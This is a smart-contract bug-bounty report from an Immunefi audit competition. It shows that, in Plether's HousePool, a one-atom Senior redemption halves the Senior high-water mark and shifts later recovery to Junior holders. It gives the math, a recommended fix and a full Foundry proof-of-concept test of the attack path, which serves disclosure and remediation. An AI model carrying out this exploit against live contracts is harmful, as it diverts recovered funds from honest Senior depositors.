# \#99768 [SC-Low] One-atom Senior redemption halves the Senior high-water mark

**Submitted on Nov 15th 2026 at 07:26:46 UTC by @Abhan for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99768
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief / Intro

The Senior high-water mark is what gives the remaining Senior holders first claim on any later recovery, but when Senior principal has been driven down to a couple of atoms, a holder of just over one third of the Senior shares can redeem them for a single USDG atom and delete half of that mark. The redemption quote adds the ERC-4626 virtual asset, so at a principal of 2 atoms the one-third holder is quoted 1 atom, which is half of the principal, and `scaleSeniorOnWithdraw` scales the mark down by the asset fraction (1/2) instead of the share fraction (about 1/3). Recovery is then routed to Senior only up to the halved mark, and everything above it goes to Junior, so a holder with Junior exposure takes recovery that belonged to the Senior holders who stayed. In the PoC, which uses release parameters, the production router, engine, pool and vaults and only Pyth and USDG mocks, trading payouts leave 2 atoms of Senior principal, the attacker's redemption of about 116,000 USDG worth of Senior shares is paid 1 atom, the mark drops from 344,072.20 to 172,036.10 USDG, and after a 344,000 USDG recovery the honest Senior holder ends **55,964.69 USDG** worse off than in the same run without the redemption, while the attacker ends **55,960.94 USDG** better off.

## Vulnerability Details

During an LP epoch settlement, `HousePool._settleLpEpoch` freezes Senior principal `P` and Senior share supply `S`, funds the epoch's Senior redemptions from that snapshot, and then scales the waterfall state by the assets it paid:

```solidity
// HousePool.sol L845-L860 (_settleLpEpoch, Senior phase)
RedemptionPhase memory seniorPhase = RedemptionPhase({
    pricingPrincipal: seniorPrincipal,
    pricingSupply: _seniorShareSupply(),
    budget: _min(freeAssets, seniorPrincipal),
    ...
});
seniorPhase = _fundRedemptionPhase(
    seniorVault, result.cutoffEpoch, seniorPhase, _settlementFeeBps(true, statusSnapshot.oracleFrozen)
);
if (seniorPhase.fundedAssets > 0) {
    HousePoolWaterfallAccountingLib.WaterfallState memory nextState =
        HousePoolWaterfallAccountingLib.scaleSeniorOnWithdraw(_getWaterfallState(), seniorPhase.fundedAssets);
```

The quote for `s` redeemed shares includes the vault's virtual offsets. With no frozen-oracle fee it is `A = floor(s × (P + 1) / (S + 1000))`:

```solidity
// HousePoolRedemptionMathLib.sol L45-L46
uint256 grossAssets =
    Math.mulDiv(shares, principal + virtualAssets, supply + virtualShares, Math.Rounding.Floor);
```

After paying `A`, the mark `H` is reduced by the asset fraction `A / P`. The shares burned do not enter the calculation:

```solidity
// HousePoolWaterfallAccountingLib.sol L119-L131 (scaleSeniorOnWithdraw)
nextState.seniorHighWaterMark -= Math.mulDiv(
    state.seniorHighWaterMark, fundedAssets, state.seniorPrincipal, Math.Rounding.Floor
);
nextState.seniorPrincipal -= fundedAssets;
```

For a healthy tranche the two fractions are practically identical. When Senior principal is a few atoms they are not. At `P = 2`, the `+1` virtual asset means that any holder of just over one third of the shares is quoted `floor(s × 3 / (S + 1000)) = 1` atom, which is half of `P`. The pool therefore deletes half of `H` while roughly two thirds of the shares are still outstanding. The request is accepted despite its tiny value, because `_requireMinimumRedeemSize` (TrancheVault.sol L1611-L1617) waives the minimum for a request that redeems the owner's whole balance, and in any case the request can be placed while the tranche is still healthy and only priced at settlement.

The damage appears when value comes back. `distributeRevenue` restores Senior only up to the stored mark and credits everything above it to Junior:

```solidity
// HousePoolWaterfallAccountingLib.sol L147-L158 (distributeRevenue)
if (remaining > 0 && nextState.seniorPrincipal < nextState.seniorHighWaterMark) {
    uint256 deficit = nextState.seniorHighWaterMark - nextState.seniorPrincipal;
    uint256 restore = remaining < deficit ? remaining : deficit;
    nextState.seniorPrincipal += restore;
    remaining -= restore;
}
...
nextState.juniorPrincipal += remaining;
```

With the mark halved, half of the Senior tranche's recovery priority is gone, and recovery beyond the reduced mark goes to Junior. A holder who owns Senior and Junior shares gives up a Senior position that is nearly worthless at that moment and collects the diverted recovery through its Junior shares. The asset-fraction formula is the fix applied for Cecuro MED-11, which replaced the earlier share-based reduction; near a full Senior wipe the virtual asset makes `A / P` larger than the share fraction, so the fix now removes too much protection.

The concrete path runs as follows. The tranches hold 344,000 USDG of Senior (228,000 honest, 116,000 attacker, just over one third of the shares) and 86,000 USDG of Junior (almost all owned by the attacker). Early in an LP epoch the attacker queues a redemption of all its Senior shares, and an attacker-controlled account queues a full redemption of a 1 USDG Junior position so that the epoch settles in every branch. A two-sided book opens at 1.00 (LONG 280,000 and SHORT 420,000 tokens, plus two small LONGs of 1,000 and 1,100 tokens). The basket dips to 0.95725886, where the LONG book takes profit, and the two small LONGs close at 0.97989978 and 0.97999990 as it recovers. These close prices are sized off-chain so that the payouts leave the right number of atoms, since each 1e-8 of close price moves 10 or 11 atoms of payout. The basket then rises to the 2.00 cap and the SHORT book closes at its maximum profit. Every payout is made in cash, no trader claim is created, and the pool is left with 2 atoms. The last small close briefly takes cash below the SHORT book's maximum liability, which latches degraded mode; once the book is flat and the pool is solvent, the owner clears it with the documented `clearDegradedMode`. At settlement Senior principal is 2 atoms, the attacker is paid 1 atom, and the high-water mark falls from 344,072.198535 to 172,036.099268 USDG. A recovery is then recognized through the owner's documented `HousePool.accountExcess()`.

## Impact Details

The waterfall promises that the Senior holders who stay keep their full recovery priority until their losses are restored, and the contract does not deliver that. A one-atom redemption cuts the remaining holders' priority in half, and every unit of recovery above the halved mark is credited to Junior instead of Senior. In the PoC, a 344,000 USDG recovery restores the honest Senior holder to 228,000.04 USDG in the control run, but only to 172,035.34 USDG after the attacker's redemption, a shortfall of 55,964.69 USDG. The attacker, whose Junior shares receive the diverted recovery, ends 55,960.94 USDG ahead of the control, even after giving up a Senior position worth about 116,000 USDG in the control. The harm needs a Senior tranche that is almost fully wiped, a large enough later recovery, and the owner's documented actions to clear degraded mode and to recognize the recovery.

## Recommendation

Scale the Senior high-water mark on withdrawal by the fraction of shares burned rather than by the fraction of principal paid (for example `floor(H × fundedShares / S)` using the same frozen supply), or cap the asset-based reduction at the share fraction, so that a redemption can never remove more recovery priority than the share of the tranche it actually exits.

## References

Senior redemptions are funded from the frozen principal and supply and then scale the waterfall: [HousePool.sol#L845-L860](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol?plain=1#L845-L860)

The redemption quote includes the virtual offsets: [HousePoolRedemptionMathLib.sol#L39-L47](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolRedemptionMathLib.sol?plain=1#L39-L47)

The high-water mark is reduced by the asset fraction: [HousePoolWaterfallAccountingLib.sol#L119-L131](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol?plain=1#L119-L131)

Recovery restores Senior only up to the mark and credits the rest to Junior: [HousePoolWaterfallAccountingLib.sol#L140-L159](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol?plain=1#L140-L159)

A full-balance redemption is exempt from the minimum size: [TrancheVault.sol#L1611-L1617](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol?plain=1#L1611-L1617)


## Proof of Concept

## Proof of Concept

The vulnerability is demonstrated by a runnable Foundry test against the audit repository, `immunefi-team/audit-comp-plether` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The complete test code is included at the end of this section.

The test extends the repository's own `BasePerpTest` harness (`packages/perps/test/perps/BasePerpTest.sol`) and does not modify any contract under `src/`. The only mocks are the repository's Pyth and USDG test contracts. Every trade goes through the production V3 entry point `IPerpsTraderActions.commitOrder(OrderRequest)` and is executed by an arbitrary keeper through `router.executeOrder`, with a signed basket published one second after the commit. Every LP deposit, redemption and claim uses the public vault functions, and every epoch is settled through the permissionless `router.settleLpEpoch`. The only owner actions are the documented `CfdEngine.clearDegradedMode()` and `HousePool.accountExcess()`. No protocol contract is impersonated, and no pool balance is burned, minted or overwritten: the loss comes entirely from trader payouts. The test applies the release parameters from `DEPLOYMENT.md`, including the 80% Senior share cap.

### Step-by-step (`test_OneAtomSeniorRedemptionHalvesHwmAndShiftsRecoveryToJunior`)

**Setup.** On Monday the attacker deposits 86,000 USDG of Junior, an attacker-controlled account deposits 1 USDG of Junior, the honest Senior LP deposits 228,000 USDG and the attacker deposits 116,000 USDG of Senior. On Tuesday, early in an LP epoch, the attacker-controlled account queues a full redemption of its Junior position.

**Redemption (attack branch only).** The attacker queues a redemption of all its Senior shares in the same epoch.

**Loss.** The two-sided book opens at 1.00, the basket dips and the LONG winners close, then the basket reaches the 2.00 cap and the SHORT book closes at its maximum profit. The pool is left with exactly 2 atoms and no trader claims. The owner clears the degraded latch once the book is flat.

**Settlement.** A keeper settles the epoch. Senior principal is 2 atoms. In the attack branch the attacker's redemption is paid 1 atom and the high-water mark falls from 344,072.198535 to 172,036.099268 USDG; in the control branch it stays at 344,072.198535 USDG.

**Recovery.** 344,000 USDG reaches the pool and the owner calls `accountExcess()`. The honest Senior holder is worth 228,000.038303 USDG in the control and 172,035.343549 USDG in the attack branch, a loss of **55,964.694754 USDG**. The attacker is worth 115,998.960137 USDG in the control and 171,959.904750 USDG in the attack branch, a gain of **55,960.944613 USDG**.

### How to run

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/poc
# save the test code below as packages/perps/test/poc/SeniorAtomHwmRedemption.t.sol
cd packages/perps
FOUNDRY_TEST=test/poc FOUNDRY_SCRIPT=test/poc forge test --match-path test/poc/SeniorAtomHwmRedemption.t.sol -vv
```

The two `FOUNDRY_*` variables limit compilation to the PoC. The package builds with via-IR, so compiling its whole test suite takes much longer; running without them also works. Expected result: `Suite result: ok. 1 passed; 0 failed; 0 skipped`, with the values above in the logs.

### PoC code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IPerpsTraderActions} from "@plether/perps/interfaces/IPerpsTraderActions.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @title A one-atom Senior redemption removes half of the Senior high-water mark
/// @notice When trading losses leave Senior principal at 2 atoms, the redemption quote includes the ERC-4626 virtual
///         asset: `A = floor(s * (P + 1) / (S + 1000))`. A holder of just over one third of the Senior shares is funded
///         1 atom, which is half of `P`, and `scaleSeniorOnWithdraw` then removes `floor(H * A / P)`, half of the
///         high-water mark, although two thirds of the shares remain. Later recovery restores Senior only up to the
///         reduced mark and credits the rest to Junior.
/// @dev Release parameters from packages/perps/DEPLOYMENT.md. Every trade goes through the production V3
///      `commitOrder` and permissionless `executeOrder`; every LP action uses the public vault functions and
///      `router.settleLpEpoch`. The loss comes only from trader payouts. The recovery is recognized through the
///      owner's documented `HousePool.accountExcess()`. Pyth and USDG are the only mocks. No contract under src/ is
///      modified or impersonated, and no pool balance is burned or overwritten.
contract SeniorAtomHwmRedemptionTest is BasePerpTest {

    address internal constant HONEST_SENIOR = address(0x5E1); // Senior LP who stays
    address internal constant ATTACKER = address(0xA11CE); // holds ~1/3 of Senior shares and Junior shares
    address internal constant AUX = address(0xA11CF); // attacker-controlled account with a dust Junior position
    address internal constant LONG_TRADER = address(0x1011);
    address internal constant FINE_TRADER = address(0x1012);
    address internal constant FINE_TRADER_2 = address(0x1013);
    address internal constant SHORT_TRADER = address(0x5011);
    address internal constant DONOR = address(0xD0); // source of the later recovery
    address internal constant KEEPER = address(0xBEEF);

    uint256 internal constant ONE = 1e8;
    uint256 internal constant CAP = 2e8;
    uint256 internal constant RECOVERY = 344_000e6; // about what the Senior tranche lost

    uint256 internal epochStart;
    uint256 internal auxRequestId;

    // ------------------------------------------------------------------------------------------------------------
    // Release configuration
    // ------------------------------------------------------------------------------------------------------------

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);

        // The admin timelocks above end inside a weekend closure; resume on the next Monday 10:00 UTC.
        vm.warp(SETUP_TIMESTAMP + 7 days);
        // Junior first: Senior capacity is bounded by 80% of the tranche total.
        _publicDeposit(juniorVault, ATTACKER, 86_000e6);
        _publicDeposit(juniorVault, AUX, 1e6);
        _publicDeposit(seniorVault, HONEST_SENIOR, 228_000e6);
        _publicDeposit(seniorVault, ATTACKER, 116_000e6); // just over one third of the Senior shares

        _fundTrader(LONG_TRADER, 100_000e6);
        _fundTrader(FINE_TRADER, 1000e6);
        _fundTrader(FINE_TRADER_2, 1000e6);
        _fundTrader(SHORT_TRADER, 200_000e6);

        // Tuesday 10:00 UTC of the same week: regular trading, one day of Senior coupon since the deposits.
        _goto(SETUP_TIMESTAMP + 8 days);
        assertFalse(engine.isOracleFrozen(), "regular trading hours");
        assertEq(pool.maxSeniorShareBps(), 8000, "release Senior share cap");
        epochStart = (vm.getBlockTimestamp() / 3600 + 1) * 3600;
        _goto(epochStart + 60);
        _markNow(ONE);

        // The attacker-controlled dust Junior holder queues a full redemption so that the epoch settles in both
        // branches (Junior will be wiped, so this request is refunded).
        uint256 auxShares = juniorVault.balanceOf(AUX);
        vm.prank(AUX);
        auxRequestId = juniorVault.requestRedeem(auxShares, AUX, AUX);
    }

    // ------------------------------------------------------------------------------------------------------------
    // Helpers (public entry points only)
    // ------------------------------------------------------------------------------------------------------------

    function _goto(
        uint256 timestamp
    ) internal {
        require(timestamp >= vm.getBlockTimestamp(), "time moves forward");
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _payload(
        uint256 price,
        uint256 publishTime
    ) internal pure returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i],
                MockPyth.MockPrice(SafeCast.toInt64(SafeCast.toInt256(price)), 0, -8, publishTime, publishTime - 1)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    function _markNow(
        uint256 price
    ) internal {
        bytes[] memory data = _payload(price, vm.getBlockTimestamp());
        vm.prank(KEEPER);
        router.updateMarkPrice(data);
    }

    function _publicDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _goto(vault.depositEpochStart(requestId));
        bytes[] memory data = _payload(ONE, vm.getBlockTimestamp());
        vm.prank(KEEPER);
        router.settleLpEpoch(data);
        assertEq(vault.claimableDepositRequest(requestId, lp), amount, "deposit activated in full");
        vm.prank(lp);
        vault.claimDeposit(requestId, amount, lp, lp);
    }

    /// @dev Commit, then a keeper executes one second later with a tick at `price` published after the commit.
    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        uint256 window = router.maxExecutionWindowSeconds();
        uint256 c = vm.getBlockTimestamp();
        uint256 target = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(account, router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: target,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(c + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        uint256 before = _size(account);
        vm.prank(account);
        uint64 id = IPerpsTraderActions(address(router)).commitOrder(request);
        _goto(c + 1);
        bytes[] memory data = _payload(price, c + 1);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "trade executed");
        assertEq(_size(account), isClose ? before - size : before + size, "size");
        _goto(vm.getBlockTimestamp() + 1);
    }

    function _size(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _projectedSenior() internal view returns (uint256 s) {
        (s,,,) = pool.getPendingTrancheState();
    }

    function _usd(
        string memory label,
        uint256 v
    ) internal pure {
        string memory frac = vm.toString(v % 1e6);
        while (bytes(frac).length < 6) {
            frac = string.concat("0", frac);
        }
        console2.log(string.concat(label, ": ", vm.toString(v / 1e6), ".", frac));
    }

    // ------------------------------------------------------------------------------------------------------------
    // Engine-driven loss to a 2-atom Senior principal
    // ------------------------------------------------------------------------------------------------------------

    uint256 internal constant F1 = 1000e18; // 10 lots: 10 atoms of payout per 1e-8 of close price
    uint256 internal constant F2 = 1100e18; // 11 lots: 11 atoms of payout per 1e-8 of close price

    /// @dev Opens a two-sided book at 1.00 plus two small LONGs used to fine-tune the residual to the atom.
    function _openBook() internal {
        // Each SHORT open keeps |skew| unchanged or larger, so the SHORT book never receives a VPI rebate that would be
        // clawed back from its payout. Final book: LONG 280k, SHORT 420k, skew 140k (inside the 40% cap).
        _trade(SHORT_TRADER, CfdTypes.Side.SHORT, 140_000e18, 15_000e6, false, ONE);
        _trade(LONG_TRADER, CfdTypes.Side.LONG, 280_000e18, 10_000e6, false, ONE);
        _trade(SHORT_TRADER, CfdTypes.Side.SHORT, 280_000e18, 25_000e6, false, ONE);
        _trade(FINE_TRADER, CfdTypes.Side.LONG, F1, 100e6, false, ONE);
        _trade(FINE_TRADER_2, CfdTypes.Side.LONG, F2, 100e6, false, ONE);
    }

    /// @dev The basket dips to `pLow` and the LONG book takes profit, the two small LONGs close at `p1` and `p2` as the
    ///      basket recovers, then the basket rises to the 2.00 cap and the SHORT book closes at its maximum profit.
    function _payOutWinners(
        uint256 pLow,
        uint256 p1,
        uint256 p2
    ) internal {
        _trade(LONG_TRADER, CfdTypes.Side.LONG, _size(LONG_TRADER), 0, true, pLow);
        _trade(FINE_TRADER, CfdTypes.Side.LONG, F1, 0, true, p1);
        _trade(FINE_TRADER_2, CfdTypes.Side.LONG, F2, 0, true, p2);
        _trade(SHORT_TRADER, CfdTypes.Side.SHORT, _size(SHORT_TRADER), 0, true, CAP);
    }

    /// @dev Close prices sized off-chain by simulating candidates (8-decimal price steps). With them, the closes leave
    ///      exactly 2 atoms of Senior principal. Below about 0.989 the small LONGs' price gain exceeds the VPI charge on
    ///      their close, so each 1e-8 of close price moves 10 (F1) or 11 (F2) atoms, which reaches any atom count.
    uint256 internal constant P_LOW = 95_725_886; // basket dip 1.00 -> 0.95725886
    uint256 internal constant P_F1 = 97_989_978;
    uint256 internal constant P_F2 = 97_999_990;

    struct Outcome {
        uint256 seniorAtSettle;
        uint256 hwmAfter;
        uint256 fundedToAttacker;
        uint256 honestSeniorValue;
        uint256 attackerValue;
    }

    /// @dev `attack`: the attacker queues a redemption of all its Senior shares before the loss.
    function _run(
        bool attack
    ) internal returns (Outcome memory o) {
        uint256 requestId;
        uint256 shares = seniorVault.balanceOf(ATTACKER);
        if (attack) {
            vm.prank(ATTACKER);
            requestId = seniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
            assertEq(seniorVault.depositEpochStart(requestId), epochStart + 3600, "matures with the aux request");
        }

        _openBook();
        _payOutWinners(P_LOW, P_F1, P_F2);
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no trader claims");
        assertEq(pool.totalAssets(), 2, "two atoms of pool cash left");
        // The second small close left cash a few thousand atoms under the SHORT book's maximum liability, which latched
        // degraded mode. With the book now flat and the pool solvent, the owner clears it (documented owner action).
        assertTrue(engine.degradedMode(), "degraded latched during the closes");
        vm.prank(engine.owner());
        engine.clearDegradedMode();
        o.seniorAtSettle = _projectedSenior();

        _goto(epochStart + 3600);
        bytes[] memory data = _payload(CAP, vm.getBlockTimestamp());
        vm.prank(KEEPER);
        router.settleLpEpoch(data);
        o.hwmAfter = pool.seniorHighWaterMark();
        if (attack) {
            o.fundedToAttacker = seniorVault.claimableRedeemAssets(requestId, ATTACKER);
            vm.prank(ATTACKER);
            seniorVault.claimRedeem(requestId, shares, ATTACKER, ATTACKER);
        }

        // Later recovery, recognized through the owner's documented action.
        settlementToken.mint(DONOR, RECOVERY);
        vm.prank(DONOR);
        settlementToken.transfer(address(pool), RECOVERY);
        vm.prank(pool.owner());
        pool.accountExcess();

        o.honestSeniorValue = seniorVault.convertToAssets(seniorVault.balanceOf(HONEST_SENIOR));
        o.attackerValue = seniorVault.convertToAssets(seniorVault.balanceOf(ATTACKER))
            + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER)) + settlementToken.balanceOf(ATTACKER);
    }

    // ------------------------------------------------------------------------------------------------------------
    // Test
    // ------------------------------------------------------------------------------------------------------------

    function test_OneAtomSeniorRedemptionHalvesHwmAndShiftsRecoveryToJunior() public {
        uint256 snap = vm.snapshotState();
        Outcome memory c = _run(false);
        vm.revertToState(snap);
        Outcome memory a = _run(true);

        console2.log("Senior principal at settlement (atoms), control", c.seniorAtSettle);
        console2.log("Senior principal at settlement (atoms), attack ", a.seniorAtSettle);
        _usd("Senior HWM after settlement, control", c.hwmAfter);
        _usd("Senior HWM after settlement, attack ", a.hwmAfter);
        console2.log("atoms paid to the attacker's Senior redemption", a.fundedToAttacker);
        _usd("honest Senior value after recovery, control", c.honestSeniorValue);
        _usd("honest Senior value after recovery, attack ", a.honestSeniorValue);
        _usd("HONEST SENIOR LOSS", c.honestSeniorValue - a.honestSeniorValue);
        _usd("attacker value after recovery, control", c.attackerValue);
        _usd("attacker value after recovery, attack ", a.attackerValue);
        _usd("ATTACKER GAIN", a.attackerValue - c.attackerValue);

        assertEq(a.seniorAtSettle, 2, "Senior principal is 2 atoms");
        assertEq(a.fundedToAttacker, 1, "the attacker's redemption is funded 1 atom");
        assertEq(a.hwmAfter, c.hwmAfter - c.hwmAfter / 2, "one atom removes half of the high-water mark");
        assertGe(c.hwmAfter, 344_000e6, "control keeps the full high-water mark");
        assertGt(c.honestSeniorValue, a.honestSeniorValue, "the honest Senior holder loses recovery value");
        assertGt(a.attackerValue, c.attackerValue, "the attacker gains through its Junior shares");
    }

}
```


